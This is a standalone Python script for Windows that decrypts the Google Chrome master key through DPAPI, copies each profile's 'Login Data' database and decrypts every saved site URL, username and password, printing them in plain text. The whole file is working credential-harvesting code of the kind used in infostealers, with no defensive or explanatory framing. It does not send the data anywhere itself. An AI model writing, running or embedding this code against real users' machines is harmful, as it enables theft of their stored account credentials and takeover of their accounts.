import os
import re
import json
import base64
import sqlite3
import shutil
import win32crypt
from Cryptodome.Cipher import AES

# OS paths for google crhome local stat (key) and local data (db)
CHROME_PATH_LOCAL_STATE = os.path.normpath(
    rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State")
CHROME_PATH = os.path.normpath(
    rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data")

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[ERR] Failed to get secret key: {e}")
        return None

def generate_cipher(key, iv):
    return AES.new(key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:-16]
        tag = ciphertext[-16:]
        cipher = generate_cipher(key, iv)
        decrypted = cipher.decrypt_and_verify(payload, tag)
        return decrypted.decode()
    except Exception as e:
        return f"<Failed to decrypt: {e}>"

def get_db_connection(path):
    try:
        shutil.copy2(path, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Failed to open database: {e}")
        return None

def get_chrome_passwords():
    print("\n[+] Chrome saved passwords:\n")
    secret_key = get_secret_key()
    if not secret_key:
        return

    folders = [f for f in os.listdir(CHROME_PATH) if re.match(r"^Default$|^Profile \d+$", f)]
    index = 0

    for folder in folders:
        login_db = os.path.join(CHROME_PATH, folder, "Login Data")
        conn = get_db_connection(login_db)

        if conn:
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, user, enc_pwd = row
                    if user and enc_pwd:
                        pwd = decrypt_password(enc_pwd, secret_key)
                        print(f"[{index}]")
                        print(f"URL:  {url}")
                        print(f"User: {user}")
                        print(f"Pass: {pwd}")
                        print("-" * 50)
                        index += 1
            except Exception as e:
                print(f"[ERR] SQL error: {e}")
            finally:
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

    if index == 0:
        print("[!] No passwords found.")
    else:
        print(f"\n[✔] Total passwords found: {index}")
